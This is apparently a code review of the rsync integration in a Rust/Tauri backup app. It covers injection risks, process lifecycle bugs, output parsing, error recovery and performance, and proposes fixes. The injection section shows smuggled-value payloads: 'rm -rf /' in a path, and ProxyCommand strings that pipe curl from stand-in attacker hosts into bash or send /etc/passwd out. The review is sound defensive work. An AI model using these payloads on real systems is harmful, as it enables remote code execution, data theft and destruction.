# Rsync Integration Deep Dive Analysis

## Executive Summary

**Robustness Score: 7.5/10**

The rsync integration is well-structured with good separation of concerns, but has several critical vulnerabilities in command injection, process management, and error recovery that need addressing.

---

## 1. Command Building Analysis

### Architecture
**Location**: `/Users/florianmahner/Desktop/amber/src-tauri/src/services/rsync_service.rs:49-166`

### Process Flow
```
SyncJob → build_rsync_args() → Vec<String> → Command::new("rsync").args()
```

### Security Assessment

#### ✅ **Strengths**
1. **Proper argument escaping**: Uses `Vec<String>` instead of shell string concatenation
2. **No direct shell invocation**: Uses `Command::new("rsync").args()` which doesn't spawn a shell
3. **SSH command building**: Properly constructs SSH flags separately (lines 110-145)
4. **Path sanitization**: Ensures trailing slashes on sources (lines 183-189)

#### ⚠️ **Critical Vulnerabilities**

##### 1. **Custom Command Injection Risk (HIGH)**
**Location**: Lines 168-181
```rust
fn parse_custom_command(&self, cmd: &str, source: &str, dest: &str, link_dest: Option<&str>) -> Vec<String> {
    let processed = cmd
        .replace("{source}", &self.ensure_trailing_slash(source))
        .replace("{dest}", dest)
        .replace("{linkDest}", link_dest.unwrap_or(""));

    shell_words::split(&processed).unwrap_or_else(|_| vec![processed])
}
```

**Risk**: User-supplied paths are directly interpolated into custom commands without sanitization.

**Attack Vector**:
```bash
# Malicious job configuration
source_path: "/safe/path; rm -rf /; echo pwned"
custom_command: "rsync -a {source} {dest}"

# Results in:
"rsync -a /safe/path; rm -rf /; echo pwned/ /dest"
```

**Mitigation**: The `shell_words::split()` provides SOME protection by tokenizing, but:
- Doesn't prevent injection if user controls the custom_command field
- `unwrap_or_else` fallback bypasses tokenization on parsing errors

##### 2. **SSH Command String Injection (MEDIUM)**
**Location**: Lines 111-144
```rust
let mut ssh_cmd = "ssh".to_string();
if let Some(ref port) = ssh.port {
    if !port.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -p {}", port));  // ⚠️ No validation
    }
}
if let Some(ref identity) = ssh.identity_file {
    if !identity.trim().is_empty() {
        ssh_cmd.push_str(&format!(" -i {}", identity));  // ⚠️ No path validation
    }
}
```

**Risk**: SSH parameters are concatenated as strings without validation.

**Attack Vectors**:
- Port injection: `port: "22 -o ProxyCommand='curl attacker.com/evil|bash'"`
- Identity file: `identity_file: "/tmp/key -o ProxyCommand='...'"`
- Proxy jump: `proxy_jump: "bastion; curl evil.com/payload|bash #"`

**Real Exploit Example**:
```json
{
  "port": "22",
  "identity_file": "/key -o ProxyCommand=\"curl http://attacker.com/exfil?data=$(cat /etc/passwd|base64)\" -o StrictHostKeyChecking=no"
}
```

##### 3. **Path Traversal Risk (LOW)**
**Location**: Lines 256-269
```rust
let source_basename = if is_ssh_remote(&job.source_path) {
    job.source_path
        .split(':')
        .nth(1)
        .and_then(|path| Path::new(path).file_name())
        .and_then(|n| n.to_str())
        .unwrap_or("backup")
} else {
    Path::new(&job.source_path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("backup")
};
```

**Risk**: `file_name()` doesn't validate against `..` or absolute path injection.

**Attack Vector**:
```rust
source_path: "user@host:/path/../../etc/passwd"
// Results in basename "passwd", could overwrite critical files
```

#### 🔒 **Recommendations**

1. **Implement allowlist validation for SSH parameters**:
```rust
fn validate_ssh_port(port: &str) -> Result<u16> {
    port.parse::<u16>()
        .map_err(|_| AmberError::Config("Invalid SSH port".into()))
}

fn validate_path_safe(path: &str) -> Result<()> {
    if path.contains("..") || path.contains('\0') {
        return Err(AmberError::InvalidPath(path.into()));
    }
    Ok(())
}
```

2. **Remove custom command feature OR sandbox it**:
```rust
// Option A: Remove entirely (safest)
// Option B: Restrict to predefined templates
// Option C: Use proper command builder with validation
```

3. **Use proper SSH argument array**:
```rust
fn build_ssh_args(ssh: &SshConfig) -> Vec<String> {
    let mut args = vec!["ssh".to_string()];
    if let Some(port) = ssh.port.as_ref().and_then(|p| validate_ssh_port(p).ok()) {
        args.extend(["-p".to_string(), port.to_string()]);
    }
    // ... properly validated args only
    args
}
```

---

## 2. Process Lifecycle Management

### Architecture
```
┌─────────────────────────────────────────────────────────────┐
│ Process Lifecycle                                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  spawn_rsync()                                              │
│       │                                                     │
│       ├─→ Check is_job_running() ───┐                      │
│       │                              │ Already running?    │
│       │                              └─→ Return Error      │
│       │                                                     │
│       ├─→ Command::new("rsync")                            │
│       │     .args()                                        │
│       │     .stdout(Stdio::piped())                        │
│       │     .stderr(Stdio::piped())                        │
│       │     .spawn()?                                      │
│       │                                                     │
│       ├─→ active_jobs.insert(job_id, pid)  ← Track PID    │
│       └─→ backup_info.insert(job_id, info) ← Track state  │
│                                                             │
│  run_rsync() (in commands/rsync.rs)                        │
│       │                                                     │
│       ├─→ child.stdout.take() ─────→ Thread 1 (stdout)    │
│       ├─→ child.stderr.take() ─────→ Thread 2 (stderr)    │
│       │                                                     │
│       └─→ child.wait() ──┬─→ Success: mark_completed()    │
│                          └─→ Failure: mark_completed()     │
│                                                             │
│  kill_job()                                                 │
│       │                                                     │
│       ├─→ active_jobs.remove(job_id)                       │
│       │                                                     │
│       └─→ Unix: kill -9 -PID (process group)               │
│           └─→ pkill -9 -P PID (orphans)                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### ✅ **Strengths**

1. **Duplicate spawn protection** (Lines 240-247):
```rust
if self.is_job_running(&job.id) {
    return Err(crate::error::AmberError::JobAlreadyRunning(job.id.clone()));
}
```

2. **Proper PID tracking** (Lines 316-318):
```rust
if let Ok(mut jobs) = self.active_jobs.lock() {
    jobs.insert(job.id.clone(), child.id());
}
```

3. **Thread-safe state management**: Uses `Arc<Mutex<HashMap>>` for concurrent access

### ⚠️ **Critical Issues**

#### 1. **Race Condition in Spawn Check (HIGH)**
**Location**: Lines 241-247 → Lines 316-318

**Problem**: Time-of-check to time-of-use (TOCTOU) vulnerability:
```rust
// Thread A                          // Thread B
if self.is_job_running(&job.id) {
    // Returns false                  if self.is_job_running(&job.id) {
}                                        // Also returns false!
                                     }
let child = Command::new(...)
    .spawn()?;                       let child = Command::new(...)
                                         .spawn()?;
// Insert PID
jobs.insert(job.id, child.id());    // Overwrites Thread A's PID!
                                     jobs.insert(job.id, child.id());
```

**Result**: Two rsync processes running, but only one tracked. First process becomes orphaned.

**Fix**:
```rust
pub fn spawn_rsync(&self, job: &SyncJob) -> Result<Child> {
    let mut jobs = self.active_jobs.lock()
        .map_err(|_| AmberError::Job("Lock poisoned".into()))?;

    // Check and insert atomically
    if jobs.contains_key(&job.id) {
        return Err(AmberError::JobAlreadyRunning(job.id.clone()));
    }

    // Reserve the slot with placeholder PID
    jobs.insert(job.id.clone(), 0);
    drop(jobs); // Release lock before spawn

    let child = Command::new("rsync").args(&args).spawn()?;

    // Update with real PID
    if let Ok(mut jobs) = self.active_jobs.lock() {
        jobs.insert(job.id.clone(), child.id());
    }

    Ok(child)
}
```

#### 2. **Process Cleanup Not Guaranteed (HIGH)**
**Location**: Lines 206-219 in `commands/rsync.rs`

**Problem**: If `child.wait()` panics or thread is killed, cleanup never happens:
```rust
let status = child.wait()?;  // ⚠️ What if this blocks forever?

// Wait for reader threads
if let Some(h) = stdout_handle {
    let _ = h.join();  // ⚠️ Ignores join errors
}

// Mark completed
service.mark_completed(&job.id);  // ⚠️ Only called if wait() succeeds
```

**Consequences**:
- Job stuck in "running" state forever
- Cannot restart job (duplicate spawn protection blocks it)
- Process might be orphaned
- Memory leak in `active_jobs` HashMap

**Fix using RAII**:
```rust
struct JobGuard<'a> {
    service: &'a RsyncService,
    job_id: String,
}

impl Drop for JobGuard<'_> {
    fn drop(&mut self) {
        self.service.mark_completed(&self.job_id);
        self.service.clear_backup_info(&self.job_id);
        log::info!("Job {} cleanup completed", self.job_id);
    }
}

pub async fn run_rsync(app: tauri::AppHandle, job: SyncJob) -> Result<()> {
    let service = get_rsync_service();
    let mut child = service.spawn_rsync(&job)?;

    // RAII guard ensures cleanup even on panic
    let _guard = JobGuard {
        service,
        job_id: job.id.clone(),
    };

    // ... rest of function
}
```

#### 3. **Kill Doesn't Wait for Termination (MEDIUM)**
**Location**: Lines 336-369

**Problem**: Fires kill signals but doesn't verify process actually died:
```rust
pub fn kill_job(&self, job_id: &str) -> Result<()> {
    if let Ok(mut jobs) = self.active_jobs.lock() {
        if let Some(pid) = jobs.remove(job_id) {
            let _ = Command::new("kill").args(["-9", &format!("-{}", pid)]).status();
            let _ = Command::new("kill").args(["-9", &pid.to_string()]).status();
            let _ = Command::new("pkill").args(["-9", "-P", &pid.to_string()]).status();
        }
    }
    Ok(())  // ⚠️ Always returns Ok, even if kill failed!
}
```

**Consequences**:
- Process might still be running after kill_job() returns
- Job marked as stopped but still consuming resources
- Partial backup data left in inconsistent state

**Fix**:
```rust
pub fn kill_job(&self, job_id: &str) -> Result<()> {
    if let Ok(mut jobs) = self.active_jobs.lock() {
        if let Some(pid) = jobs.remove(job_id) {
            // Send SIGTERM first (graceful)
            let _ = Command::new("kill").args([&format!("-{}", pid)]).status();

            // Wait up to 5 seconds for graceful shutdown
            for _ in 0..50 {
                if !process_exists(pid) {
                    return Ok(());
                }
                std::thread::sleep(Duration::from_millis(100));
            }

            // Force kill if still alive
            let status = Command::new("kill")
                .args(["-9", &format!("-{}", pid)])
                .status()?;

            if !status.success() {
                return Err(AmberError::Job(format!("Failed to kill PID {}", pid)));
            }
        }
    }
    Ok(())
}

fn process_exists(pid: u32) -> bool {
    Command::new("kill")
        .args(["-0", &pid.to_string()])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}
```

#### 4. **No Timeout on wait() (HIGH)**
**Location**: Line 207 in `commands/rsync.rs`

**Problem**: `child.wait()` blocks forever if rsync hangs:
```rust
let status = child.wait()?;  // Blocks indefinitely!
```

**Scenarios**:
- SSH connection hangs
- Network failure mid-transfer
- Filesystem deadlock
- rsync bug/crash without exit

**Impact**:
- UI shows "running" forever
- Cannot cancel (kill_job can't find hung process)
- Tauri backend thread blocked
- User must force-quit app

**Fix**:
```rust
use std::time::Duration;

// Add to spawn_rsync or run_rsync
let timeout = Duration::from_secs(job.config.timeout_seconds.unwrap_or(3600));
let start = Instant::now();

loop {
    match child.try_wait()? {
        Some(status) => {
            // Process exited
            break Ok(status);
        }
        None => {
            // Still running
            if start.elapsed() > timeout {
                // Timeout - kill it
                let _ = service.kill_job(&job.id);
                return Err(AmberError::Job("Backup timeout".into()));
            }
            std::thread::sleep(Duration::from_millis(100));
        }
    }
}
```

---

## 3. Output Parsing Analysis

### Architecture
**Location**: `/Users/florianmahner/Desktop/amber/src-tauri/src/commands/rsync.rs:47-60, 126-204`

### Parsing Strategy
```
┌──────────────────────────────────────────────────────────┐
│ Output Processing Pipeline                               │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  rsync stdout/stderr                                     │
│        │                                                 │
│        ├─→ BufReader::new(stdout)                       │
│        │      │                                          │
│        │      └─→ reader.lines() ─→ Thread 1            │
│        │              │                                  │
│        │              ├─→ parse_rsync_progress()?       │
│        │              │      ├─→ Match: emit progress   │
│        │              │      └─→ No match: emit log     │
│        │              │                                  │
│        │              └─→ Update current_file           │
│        │                                                 │
│        └─→ BufReader::new(stderr)                       │
│               │                                          │
│               └─→ reader.lines() ─→ Thread 2            │
│                       │                                  │
│                       └─→ emit log with [stderr] prefix │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

### Progress Regex
```rust
let re = Regex::new(r"^\s*([\d,]+)\s+(\d+)%\s+([\d.]+[KMG]?B/s)\s+(\d+:\d+:\d+)").ok()?;
```

**Matches**:
```
"         16,384 100%    4.00MB/s    0:00:00 (xfr#2, to-chk=5/10)"
         ^^^^^^^  ^^^    ^^^^^^^^     ^^^^^^^^
         bytes    pct    speed        eta
```

### ✅ **Strengths**

1. **Non-blocking IO**: Separate threads for stdout/stderr prevent deadlocks
2. **Graceful failure**: `unwrap_or` patterns prevent crashes on parse errors
3. **Real-time streaming**: Events emitted immediately as lines arrive

### ⚠️ **Issues**

#### 1. **Incomplete Progress Parsing (MEDIUM)**
**Problem**: Regex only matches one rsync output format:
```rust
// MATCHES:
"         16,384 100%    4.00MB/s    0:00:00"

// DOESN'T MATCH:
"         16,384  25%    4.00MB/s    0:00:02  (xfr#1, ir-chk=1000/1024)"
"backup.tar.gz"
"sending incremental file list"
"total size is 1.23G  speedup is 1.00"
```

**Impact**: Progress updates lost for multi-file transfers, only final file shown.

#### 2. **Current File Detection Fragile (LOW)**
**Location**: Lines 158-164
```rust
if !line.starts_with("sending")
    && !line.starts_with("receiving")
    && !line.starts_with("total")
    && !line.contains("files to consider")
{
    current_file = Some(line.clone());
}
```

**Problem**: Blacklist approach - any unexpected rsync output gets treated as filename.

**False Positives**:
- Error messages
- Warning messages
- Summary statistics
- Rsync debug output (if `-v` enabled)

#### 3. **No Handling of Rsync Errors in Stdout (MEDIUM)**
**Problem**: Rsync prints errors to stdout AND stderr:
```bash
$ rsync -a /src /dest
rsync: failed to set permissions on "/dest/file.txt": Operation not permitted (1)
rsync error: some files/attrs were not transferred (see previous errors) (code 23)
```

**Current behavior**: These get emitted as generic log messages, not highlighted as errors.

#### 4. **Thread Join Errors Ignored (LOW)**
**Location**: Lines 210-214
```rust
if let Some(h) = stdout_handle {
    let _ = h.join();  // Ignores Result
}
if let Some(h) = stderr_handle {
    let _ = h.join();  // Ignores Result
}
```

**Problem**: If reader thread panics, we silently lose final output.

### 🔧 **Recommendations**

1. **Enhanced progress parsing**:
```rust
fn parse_rsync_progress(line: &str) -> Option<ProgressInfo> {
    // Try main progress format
    if let Some(captures) = PROGRESS_REGEX.captures(line) {
        return Some(extract_progress(captures));
    }

    // Try file transfer format
    if line.contains("xfr#") {
        return Some(extract_file_transfer(line));
    }

    // Try total size summary
    if line.starts_with("total size is") {
        return Some(extract_summary(line));
    }

    None
}
```

2. **Structured log levels**:
```rust
enum RsyncLogLevel {
    Info,
    Warning,
    Error,
    Debug,
}

fn classify_log_line(line: &str) -> RsyncLogLevel {
    if line.contains("error:") || line.contains("failed") {
        RsyncLogLevel::Error
    } else if line.contains("warning:") || line.contains("skipping") {
        RsyncLogLevel::Warning
    } else if line.starts_with("sending") || line.starts_with("receiving") {
        RsyncLogLevel::Info
    } else {
        RsyncLogLevel::Debug
    }
}
```

---

## 4. Error Recovery Analysis

### Current Error Handling

```rust
// In run_rsync()
let status = child.wait()?;

if status.success() {
    // Write manifest, update symlink, cleanup
    Ok(())
} else {
    service.clear_backup_info(&job.id);
    let error_msg = format!("rsync exited with code {:?}", status.code());
    Err(crate::error::AmberError::Rsync(error_msg))
}
```

### ⚠️ **Critical Gaps**

#### 1. **No Partial Backup Cleanup (HIGH)**

**Problem**: Failed backups leave partial data in place:

**Scenario**:
```bash
# Time Machine mode creates:
/dest/backup_source/2024-12-04-153042/
    Users/
        john/
            Documents/  ← rsync fails here
```

**Result after failure**:
- Partial snapshot directory exists
- Not indexed (good - `index_snapshot` only called on success)
- Not in manifest (good - `add_snapshot_to_manifest` only on success)
- But wasted disk space
- Confusing for users browsing destination

**Impact**: Multiple failed attempts = GBs of partial snapshots.

**Fix**:
```rust
let status = child.wait()?;

if status.success() {
    // ... existing success logic
} else {
    // Cleanup partial backup
    if let Some(info) = backup_info {
        log::warn!("Backup failed, cleaning up partial snapshot: {:?}", info.snapshot_path);

        // Only remove if it's a timestamped snapshot (not "current")
        if info.folder_name != "current" {
            if let Err(e) = std::fs::remove_dir_all(&info.snapshot_path) {
                log::error!("Failed to cleanup partial backup: {}", e);
            }
        }
    }

    service.clear_backup_info(&job.id);
    Err(crate::error::AmberError::Rsync(error_msg))
}
```

#### 2. **No Retry Logic (MEDIUM)**

**Problem**: Transient failures treated same as permanent failures:
```rust
// No distinction between:
// - Network timeout (retryable)
// - Permission denied (permanent)
// - Out of space (permanent)
// - SSH auth failure (permanent)
```

**Rsync Exit Codes**:
```
 0 = Success
 1 = Syntax error
 3 = Errors selecting input/output files
 5 = Error starting client-server protocol
10 = Error in socket I/O
11 = Error in file I/O
12 = Error in rsync protocol
13 = Errors with program diagnostics
23 = Partial transfer due to error
24 = Partial transfer due to vanished source files
30 = Timeout in data send/receive
35 = Timeout waiting for daemon response
```

**Retryable codes**: 10, 11, 12, 30, 35

**Fix**:
```rust
#[derive(Clone)]
pub struct RetryConfig {
    pub max_attempts: u32,
    pub backoff_seconds: u64,
    pub retryable_codes: Vec<i32>,
}

impl Default for RetryConfig {
    fn default() -> Self {
        Self {
            max_attempts: 3,
            backoff_seconds: 5,
            retryable_codes: vec![10, 11, 12, 23, 30, 35],
        }
    }
}

pub async fn run_rsync_with_retry(
    app: tauri::AppHandle,
    job: SyncJob,
    retry_config: RetryConfig,
) -> Result<()> {
    let mut attempt = 0;

    loop {
        attempt += 1;

        match run_rsync(app.clone(), job.clone()).await {
            Ok(()) => return Ok(()),
            Err(e) => {
                let should_retry = if let AmberError::Rsync(msg) = &e {
                    // Extract exit code from error message
                    extract_exit_code(msg)
                        .map(|code| retry_config.retryable_codes.contains(&code))
                        .unwrap_or(false)
                } else {
                    false
                };

                if !should_retry || attempt >= retry_config.max_attempts {
                    return Err(e);
                }

                log::warn!(
                    "Rsync attempt {} failed, retrying in {}s...",
                    attempt,
                    retry_config.backoff_seconds
                );

                tokio::time::sleep(Duration::from_secs(
                    retry_config.backoff_seconds * attempt as u64
                )).await;
            }
        }
    }
}
```

#### 3. **No Disk Space Pre-check (MEDIUM)**

**Problem**: Starts backup without checking destination has space:
```rust
pub fn spawn_rsync(&self, job: &SyncJob) -> Result<Child> {
    // No space check!
    std::fs::create_dir_all(&target_base)?;

    let child = Command::new("rsync").args(&args).spawn()?;
    // Backup starts, then fails hours later due to full disk
}
```

**Fix**:
```rust
use std::fs::metadata;

fn check_disk_space(dest_path: &str, required_bytes: u64) -> Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;

        let stat = nix::sys::statvfs::statvfs(dest_path)?;
        let available = stat.f_bavail * stat.f_bsize;

        if available < required_bytes {
            return Err(AmberError::Filesystem(format!(
                "Insufficient space: need {}GB, have {}GB",
                required_bytes / 1_000_000_000,
                available / 1_000_000_000
            )));
        }
    }

    Ok(())
}

// In spawn_rsync:
if job.mode == SyncMode::TimeMachine {
    let source_size = estimate_source_size(&job.source_path)?;
    check_disk_space(&job.dest_path, source_size)?;
}
```

#### 4. **No Orphaned Process Recovery (HIGH)**

**Problem**: If app crashes during backup, rsync keeps running:
```rust
// App starts
let child = spawn_rsync()?;
// App crashes (panic, force quit, system crash)
// rsync process keeps running, untracked
// App restarts - no knowledge of orphan process
```

**Consequences**:
- Background rsync consuming resources
- Duplicate backup if user starts same job
- Partial backups consuming space

**Fix**:
```rust
// On app startup
pub fn recover_orphaned_jobs() -> Result<()> {
    log::info!("Checking for orphaned rsync processes...");

    let output = Command::new("pgrep")
        .args(["-f", "^rsync.*amber"])  // Match rsync with amber paths
        .output()?;

    if output.status.success() {
        let pids = String::from_utf8_lossy(&output.stdout);
        for pid in pids.lines() {
            log::warn!("Found orphaned rsync process: {}", pid);

            // Try to match with known jobs
            if let Some(job_id) = identify_job_from_pid(pid) {
                log::info!("Reattaching to job {}", job_id);
                // Attempt to reattach stdout/stderr
            } else {
                log::warn!("Killing unknown rsync process: {}", pid);
                let _ = Command::new("kill").args(["-9", pid]).status();
            }
        }
    }

    Ok(())
}
```

---

## 5. Progress Tracking Analysis

### Architecture

```
┌────────────────────────────────────────────────────┐
│ Frontend ← Tauri Events ← Backend                  │
├────────────────────────────────────────────────────┤
│                                                    │
│  rsync-progress                                    │
│  {                                                 │
│    job_id: "abc123",                               │
│    transferred: "16,384",                          │
│    percentage: 75,                                 │
│    speed: "4.00MB/s",                              │
│    eta: "0:00:30",                                 │
│    current_file: "Documents/large_file.zip"        │
│  }                                                 │
│                                                    │
│  rsync-log                                         │
│  {                                                 │
│    job_id: "abc123",                               │
│    message: "sending incremental file list"        │
│  }                                                 │
│                                                    │
│  rsync-complete                                    │
│  {                                                 │
│    job_id: "abc123",                               │
│    success: true,                                  │
│    error: null                                     │
│  }                                                 │
│                                                    │
└────────────────────────────────────────────────────┘
```

### ✅ **Strengths**

1. **Real-time updates**: Events emitted as lines arrive
2. **Structured payloads**: Type-safe Rust structs serialized to JSON
3. **Separate log/progress channels**: UI can filter appropriately

### ⚠️ **Issues**

#### 1. **No Progress Before First File (LOW)**

**Problem**: Initial phase has no progress updates:
```bash
# Rsync startup:
building file list ...
5000 files to consider
# ← Could take minutes, no progress sent
```

**Impact**: UI shows 0% for long periods on large file trees.

#### 2. **Progress Percentage Unreliable (MEDIUM)**

**Problem**: Rsync's percentage is per-file, not total backup:
```rust
percentage: 100  // ← File 1 of 1000 complete
percentage: 50   // ← File 2 halfway
percentage: 100  // ← File 2 complete
```

**Impact**: Progress bar jumps back and forth, confusing users.

**Fix**: Accumulate transferred bytes:
```rust
struct BackupProgress {
    total_bytes_estimated: u64,
    bytes_transferred: u64,
    files_transferred: u64,
}

// Calculate real percentage:
let percentage = (progress.bytes_transferred * 100) / progress.total_bytes_estimated;
```

#### 3. **No Bandwidth Limiting Visibility (LOW)**

**Problem**: If user sets bandwidth limit, no indication in progress.

**Fix**: Add to progress payload:
```rust
struct RsyncProgressPayload {
    // ... existing fields
    bandwidth_limit: Option<String>,  // e.g., "1MB/s"
    throttled: bool,  // true if current speed < limit
}
```

---

## 6. Cancellation Analysis

### Implementation
**Location**: `/Users/florianmahner/Desktop/amber/src-tauri/src/commands/rsync.rs:324-328`

```rust
#[tauri::command]
pub async fn kill_rsync(job_id: String) -> Result<()> {
    let service = get_rsync_service();
    service.kill_job(&job_id)
}
```

### ✅ **Strengths**

1. **Simple API**: Single command exposed to frontend
2. **Multiple kill attempts**: Process group + individual + orphan cleanup

### ⚠️ **Critical Issues**

#### 1. **No Confirmation of Termination (HIGH)**

Already covered in Process Lifecycle section. Repeating for emphasis:

**Problem**: `kill_job()` fires signals but doesn't wait:
```rust
let _ = Command::new("kill").args(["-9", &format!("-{}", pid)]).status();
// Returns immediately, process might still be running!
```

#### 2. **Partial Transfer Left in Inconsistent State (MEDIUM)**

**Problem**: Hard kill (-9) doesn't let rsync cleanup:
```bash
# Rsync mid-transfer:
copying large_file.zip (50% done)
^C  # SIGKILL received
# Leaves:
# - Partial file large_file.zip with wrong size
# - No checksum verification
# - Potentially corrupted file
```

**Fix**: Two-phase shutdown:
```rust
pub fn cancel_job_gracefully(&self, job_id: &str, timeout_secs: u64) -> Result<()> {
    if let Some(pid) = self.active_jobs.lock().ok().and_then(|j| j.get(job_id).copied()) {
        // Phase 1: Send SIGTERM (graceful)
        log::info!("Sending SIGTERM to PID {}", pid);
        let _ = Command::new("kill").args([&format!("-{}", pid)]).status();

        // Phase 2: Wait for graceful shutdown
        let start = Instant::now();
        while start.elapsed().as_secs() < timeout_secs {
            if !process_exists(pid) {
                log::info!("Process {} terminated gracefully", pid);
                self.mark_completed(job_id);
                return Ok(());
            }
            std::thread::sleep(Duration::from_millis(100));
        }

        // Phase 3: Force kill if still alive
        log::warn!("Process {} did not terminate gracefully, force killing", pid);
        let _ = Command::new("kill").args(["-9", &format!("-{}", pid)]).status();
        self.mark_completed(job_id);
    }

    Ok(())
}
```

#### 3. **No UI Feedback During Kill (LOW)**

**Problem**: Cancel button pressed → no immediate feedback:
```typescript
// Frontend
await invoke('kill_rsync', { jobId });
// Returns immediately
// But rsync might still be running for seconds
// UI should show "Cancelling..." state
```

**Fix**: Emit intermediate event:
```rust
pub async fn kill_rsync(app: tauri::AppHandle, job_id: String) -> Result<()> {
    let _ = app.emit("rsync-cancelling", job_id.clone());

    let service = get_rsync_service();
    service.cancel_job_gracefully(&job_id, 10)?;

    let _ = app.emit("rsync-cancelled", job_id.clone());
    Ok(())
}
```

---

## Edge Cases That Could Fail

### 1. **SSH Key Passphrase Required**
**Scenario**: Identity file has passphrase, no SSH agent running
**Result**: rsync hangs waiting for input (stdin not provided)
**Fix**:
```rust
.stdin(Stdio::null())  // Prevent hanging on password prompt
```

### 2. **Destination Becomes Read-Only Mid-Backup**
**Scenario**: External drive mounted read-only due to corruption
**Result**: rsync fails partway through, partial snapshot left
**Fix**: Pre-flight write test + cleanup on failure

### 3. **Source Directory Deleted Mid-Backup**
**Scenario**: User deletes source while backup running
**Result**: rsync error code 23 (partial transfer)
**Fix**: Retry logic + specific error message

### 4. **Destination Network Mount Disconnects**
**Scenario**: SMB/NFS share disconnects during backup
**Result**: rsync hangs, then errors
**Fix**: Timeout + network check

### 5. **App Crashes During Snapshot Creation**
**Scenario**: App killed while rsync running
**Result**: Orphaned process + partial snapshot + job marked "running" forever
**Fix**: Recovery on startup + RAII cleanup guards

### 6. **Two Users Run Same Job Simultaneously**
**Scenario**: Two app instances, same job ID
**Result**: Both spawn rsync, file conflicts
**Fix**: File-based lock in destination directory:
```rust
fn acquire_job_lock(dest: &str, job_id: &str) -> Result<FileLock> {
    let lock_path = format!("{}/.amber-lock-{}", dest, job_id);
    FileLock::try_new(&lock_path)
        .map_err(|_| AmberError::JobAlreadyRunning(job_id.into()))
}
```

### 7. **Unicode Filename Corruption**
**Scenario**: Filenames with emoji or special characters
**Result**: Could fail on `to_str()` conversions (returns `None`)
**Fix**: Use `to_string_lossy()` consistently

### 8. **Symlink Loops**
**Scenario**: Source contains symlink pointing to parent directory
**Result**: Rsync might detect and skip, but not handled in code
**Fix**: Already handled by rsync's `--one-file-system` flag

### 9. **Very Long Paths**
**Scenario**: Paths exceeding filesystem limits (260 chars Windows, 4096 Unix)
**Result**: Rsync might fail with cryptic errors
**Fix**: Pre-check path lengths + clear error message

### 10. **Concurrent Kills of Same Job**
**Scenario**: User spams cancel button
**Result**: Multiple kill commands, HashMap entry removed multiple times (safe due to remove()), but wasteful
**Fix**: Add cancellation flag:
```rust
cancelling_jobs: Arc<Mutex<HashSet<String>>>,

pub fn kill_job(&self, job_id: &str) -> Result<()> {
    let mut cancelling = self.cancelling_jobs.lock().unwrap();
    if !cancelling.insert(job_id.into()) {
        return Ok(()); // Already cancelling
    }
    // ... rest of kill logic
}
```

---

## Missing Error Handling

### 1. **Lock Poisoning Not Handled**
```rust
// Current:
if let Ok(mut jobs) = self.active_jobs.lock() { ... }
// Silently ignores poisoned mutex (previous panic)

// Should:
let mut jobs = self.active_jobs.lock()
    .map_err(|_| AmberError::Job("Lock poisoned, system state corrupted".into()))?;
```

### 2. **File System Errors Ignored**
```rust
// Current:
std::fs::create_dir_all(&target_base)?;
// Could fail with ENOSPC, EROFS, EPERM

// Should:
std::fs::create_dir_all(&target_base)
    .map_err(|e| AmberError::fs_error(target_base.display(), e))?;
```

### 3. **Symlink Creation Failures Silent**
```rust
// Current:
if let Err(e) = service.update_latest_symlink(...) {
    log::warn!("Failed to update latest symlink: {}", e);  // ← Just logs!
}

// Should:
service.update_latest_symlink(...)
    .map_err(|e| log::warn!("Symlink update failed: {}", e))?;
// Or at minimum, emit error event to frontend
```

### 4. **Thread Spawn Failures Unhandled**
```rust
// Current:
let stdout_handle = Some(std::thread::spawn(move || { ... }));
// thread::spawn() returns Result, but not checked!

// Could fail if:
// - System out of memory
// - Thread limit reached
// - Permission denied

// Should:
let stdout_handle = std::thread::spawn(move || { ... })
    .map_err(|e| AmberError::Job(format!("Failed to spawn output reader: {}", e)))?;
```

### 5. **Invalid UTF-8 in Paths**
```rust
// Current:
final_dest.to_str().unwrap_or("")
// Silently becomes empty string!

// Should:
final_dest.to_str()
    .ok_or_else(|| AmberError::InvalidPath(format!("{:?}", final_dest)))?
```

---

## Performance Concerns

### 1. **Synchronous wait() Blocks Backend Thread**
**Location**: `child.wait()` in `run_rsync()`

**Impact**:
- Tauri backend thread blocked for hours
- Other commands queued behind it
- UI might feel sluggish

**Fix**: Use async spawning:
```rust
pub async fn run_rsync(app: tauri::AppHandle, job: SyncJob) -> Result<()> {
    let service = get_rsync_service();
    let mut child = service.spawn_rsync(&job)?;

    // Spawn monitoring in background task
    tokio::task::spawn_blocking(move || {
        let status = child.wait()?;
        // ... handle completion
    }).await??;

    Ok(())
}
```

### 2. **Regex Compiled Every Parse**
**Location**: `parse_rsync_progress()` line 51

**Impact**:
- Regex compiled for every line of output
- Thousands of compilations per backup

**Fix**: Use `once_cell::sync::Lazy`:
```rust
use once_cell::sync::Lazy;

static PROGRESS_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"^\s*([\d,]+)\s+(\d+)%\s+([\d.]+[KMG]?B/s)\s+(\d+:\d+:\d+)").unwrap()
});

fn parse_rsync_progress(line: &str) -> Option<(String, u8, String, String)> {
    let caps = PROGRESS_REGEX.captures(line)?;
    // ...
}
```

### 3. **HashMap Lookups Behind Mutex**
**Location**: `is_job_running()`, `get_backup_info()`

**Impact**:
- Every status check requires mutex lock
- Could cause contention with multiple concurrent jobs

**Optimization**: Use `DashMap` (concurrent hashmap):
```rust
use dashmap::DashMap;

pub struct RsyncService {
    active_jobs: Arc<DashMap<String, u32>>,  // Lock-free reads
    backup_info: Arc<DashMap<String, BackupInfo>>,
}

pub fn is_job_running(&self, job_id: &str) -> bool {
    self.active_jobs.contains_key(job_id)  // No lock needed
}
```

### 4. **WalkDir for Stats is Slow**
**Location**: `calculate_snapshot_stats()` line 63

**Impact**:
- Walks entire backup tree after completion
- Could be millions of files = minutes of time
- Blocks completion event

**Fix**: Calculate incrementally during transfer:
```rust
// Parse rsync's itemized changes output:
// ">f+++++++++ path/to/file"
// Extract size from rsync stats output instead of walking
```

### 5. **Event Emission Overhead**
**Location**: Lines 144, 167 - emit for every line

**Impact**:
- Thousands of IPC events per second
- Serialization overhead
- Frontend might not keep up

**Optimization**: Batch events:
```rust
let mut log_buffer = Vec::new();
let mut last_flush = Instant::now();

